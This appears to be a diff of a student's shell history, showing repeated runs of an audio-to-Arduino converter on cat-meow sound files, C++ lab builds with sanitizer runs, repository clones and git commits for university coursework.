+python -m venv venv
+source venv/bin/activate
+pip install requirements.txt -r
+pip install -r requirements.txt
+python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3
+ls
+mv audio-to-arduino.py audio_to_arduino.py
+python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3
+python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 -h
+python audio_to_arduino.py --help
+python audio_to_arduino.py -h
+python audio_to_arduino.py
+python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 480 --max-size 48
+python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 960 --max-size 48
+python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 1920 --max-size 256
+j integ
+v src/functions.cpp
+j lab4
+ls
+o .
+python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 480 --max-size 48
+python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 240 --max-size 48
+python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 120 --max-size 48
+python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 20 --max-size 48
+python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 30 --max-size 48
+python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 60 --max-size 48
+python audio_to_arduino.py ~/Downloads/cat-meow-6226.mp3 --tempo 60 --max-size 48
+python audio_to_arduino.py ~/Downloads/cat-meow-6226.mp3 --tempo 30 --max-size 48
+python audio_to_arduino.py ~/Downloads/cat-meow-6226.mp3 --tempo 20 --max-size 48
+python audio_to_arduino.py ~/Downloads/cat-meow-6226.mp3 --tempo 960 --max-size 48
+python audio_to_arduino.py ~/Downloads/cat-meow-6226.mp3 --tempo 960 --max-size 1920
+python audio_to_arduino.py ~/Downloads/cat-meow-6226.mp3 --tempo 60 --max-size 1920
+python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 60 --max-size 48
+python audio_to_arduino.py ~/Downloads/cat-meow-14536.mp3 --tempo 60 --max-size 48
+v audio_to_arduino.py
+python audio_to_arduino.py ~/Downloads/cat-meow-14536.mp3 --tempo 60 --max-size 48
+python audio_to_arduino.py ~/Downloads/cat-meow-14536.mp3 --tempo 60 --max-size 512
+v audio_to_arduino.py
+python audio_to_arduino.py ~/Downloads/cat-meow-14536.mp3 --tempo 60 --max-size 512
+python audio_to_arduino.py ~/Downloads/cat-meow-14536.mp3 --tempo 60 --max-size 512
+python audio_to_arduino.py ~/Downloads/cat-meow-14536.mp3 --tempo 60 --max-size 512
+source venv/bin/activate
+v audio_to_arduino.py
+python audio_to_arduino.py ~/Downloads/cat-meow-14536.mp3 --tempo 60 --max-size 512
+python audio_to_arduino.py ~/Downloads/cat-meow-14536.mp3 --tempo 120 --max-size 512
+python audio_to_arduino.py ~/Downloads/cat-meow-14536.mp3 --tempo 20 --max-size 512
+python audio_to_arduino.py ~/Downloads/cat-meow-14536.mp3 --tempo 240 --max-size 1024
+python audio_to_arduino.py ~/Downloads/cat-meow-6226.mp3 --tempo 240 --max-size 1024
+python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 240 --max-size 1024
+python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 240 --max-size 1024
+python audio_to_arduino.py ~/Downloads/meow-meow-sad-made-with-Voicemod.mp3 --tempo 120 --max-size 48
+j ucu cpp
+ls
+cd lab1-ratio-zaletskyi_husiev
+ls
+git pull
+python audio_to_arduino.py ~/Downloads/meow-meow-sad-made-with-Voicemod.mp3 --tempo 120 --max-size 48
+v src/QTheStubborn.cpp
+python audio_to_arduino.py ~/Downloads/meow-meow-sad-made-with-Voicemod.mp3 --tempo 120 --max-size 48
+python audio_to_arduino.py ~/Downloads/meow-meow-sad-made-with-Voicemod.mp3 --tempo 120 --max-size 48
+python audio_to_arduino.py ~/Downloads/meow-meow-sad-made-with-Voicemod.mp3 --tempo 120 --max-size 48
+python audio_to_arduino.py ~/Downloads/meow-meow-sad-made-with-Voicemod.mp3 --tempo 120 --max-size 48
+j ucu cpp
+cd lab1-ratio-zaletskyi_husiev
+git pull
+v src/QTheStubborn.cpp
+./compile.sh -d
+./compile.sh -d
+v CMakeLists.txt
+./compile.sh -d
+./bin/ratio_the_stubborn
+git add .
+git commit -m "Prettify"
+git push
+v README.md
+j ucu acs
+ls
+j ucu
+cd acs
+ls
+cd lab11-mpi-opyr-husiev
+v readme.md
+v README.md
+git add .
+git commit -m "Add readme with todos"
+git push
+j ucu cpp
+ls
+j sec
+cd ../sec
+ls
+cd lab1
+ls
+v poc/cve_2019_3924/src/main.cpp
+j sec
+v R
+cd lab1
+v README.md
+у�лву�к еу�з
+mkdir tmp
+cd tmp
+git clone git@github.com:ucu-cs/lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi --depth=1
+cd lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi
+ls
+cd ..
+\rm -r lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi
+\rm -rf lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi
+git clone git@github.com:ucu-cs/lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi --recursive
+cd lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi
+ls
+cd ..
+\rm -rf lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi
+git clone git@github.com:ucu-cs/lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi --recursive --depth=2
+cd lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi
+ls
+cd ..
+\rm -rf lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi
+git clone git@github.com:ucu-cs/lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi --recursive --depth=2
+cd lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi
+ls
+ls tomlplusplus
+ls
+cp ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/integral/test_integral.py .
+python test_integral.py parallel
+: 1743181671:0;j cpp lab1
+: 1743181672:0;ls
+: 1743181676:0;git pull
+: 1743181863:0;v src/main.cpp
+: 1743182017:0;git add .
+: 1743182033:0;git commit -m "Format"
+: 1743182039:0;v README.md
+: 1743182174:0;j ucu
+: 1743182175:0;ls
+: 1743182181:0;ranger
+: 1743182474:0;./compile.sh -d
+: 1743182490:0;v src/main.cpp
+: 1743182501:0;./compile.sh -d
+: 1743182516:0;./compile.sh -d
+: 1743182615:0;./compile.sh -d
+: 1743182628:0;ls
+: 1743182634:0;cppbuild cpplab1
+: 1743182641:0;cppcompile cpplab1 -p
+: 1743182659:0;ls bin
+: 1743182667:0;./bin/clang-asan
+: 1743182682:0;./bin/clang-ubsan
+: 1743182694:0;./bin/clang-msan
+: 1743182703:0;\rm bin/*
+: 1743182705:0;ls
+: 1743182718:0;git add .
+: 1743182727:0;git commit -m "Make it a static library"
+: 1743182783:0;git add .
+: 1743182794:0;git commit -m "Remove commented code"
